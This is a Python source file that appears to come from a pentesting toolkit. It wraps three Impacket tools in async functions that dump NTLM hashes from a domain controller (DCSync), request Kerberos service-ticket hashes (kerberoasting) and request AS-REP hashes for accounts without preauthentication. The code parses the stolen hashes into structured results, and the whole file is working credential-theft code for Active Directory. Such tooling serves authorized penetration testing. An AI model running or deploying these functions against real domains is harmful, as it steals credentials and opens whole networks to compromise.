"""Impacket suite wrappers (secretsdump, GetUserSPNs, GetNPUsers)."""

from __future__ import annotations

import re
from typing import Any

from pencheff.core.tool_runner import run_tool, tool_available


def _check(tool: str) -> dict[str, Any] | None:
    if tool_available(tool):
        return None
    return {"error": f"{tool} not installed", "install_hint": "pip install impacket"}


async def secretsdump(domain: str, user: str, password: str, dc: str) -> dict[str, Any]:
    err = _check("impacket-secretsdump") or _check("secretsdump.py")
    if err:
        return err
    bin_name = "impacket-secretsdump" if tool_available("impacket-secretsdump") else "secretsdump.py"
    target = f"{domain}/{user}:{password}@{dc}"
    res = await run_tool([bin_name, target, "-just-dc-ntlm"], timeout=600)
    creds = []
    for line in res.stdout.splitlines():
        m = re.match(r"^(\S+):\d+:[a-f0-9]{32}:([a-f0-9]{32}):::", line)
        if m:
            creds.append({"username": m.group(1), "secret": m.group(2), "type": "ntlm"})
    return {"summary": f"DCSync: {len(creds)} hash(es)", "credentials": creds,
            "stderr_tail": res.stderr[-300:]}


async def kerberoast(domain: str, user: str, password: str, dc: str) -> dict[str, Any]:
    err = _check("impacket-GetUserSPNs") or _check("GetUserSPNs.py")
    if err:
        return err
    bin_name = "impacket-GetUserSPNs" if tool_available("impacket-GetUserSPNs") else "GetUserSPNs.py"
    target = f"{domain}/{user}:{password}"
    res = await run_tool([bin_name, target, "-dc-ip", dc, "-request"], timeout=120)
    hashes = [l for l in res.stdout.splitlines() if l.startswith("$krb5tgs$")]
    return {"summary": f"Kerberoast: {len(hashes)} hash(es)",
            "tgs_hashes": hashes, "stderr_tail": res.stderr[-300:]}


async def asreproast(domain: str, dc: str, users: str = "") -> dict[str, Any]:
    err = _check("impacket-GetNPUsers") or _check("GetNPUsers.py")
    if err:
        return err
    bin_name = "impacket-GetNPUsers" if tool_available("impacket-GetNPUsers") else "GetNPUsers.py"
    args = [bin_name, f"{domain}/", "-dc-ip", dc, "-no-pass", "-request"]
    if users:
        args.extend(["-usersfile", users])
    res = await run_tool(args, timeout=120)
    hashes = [l for l in res.stdout.splitlines() if l.startswith("$krb5asrep$")]
    return {"summary": f"AS-REP: {len(hashes)} hash(es)",
            "asrep_hashes": hashes, "stderr_tail": res.stderr[-300:]}
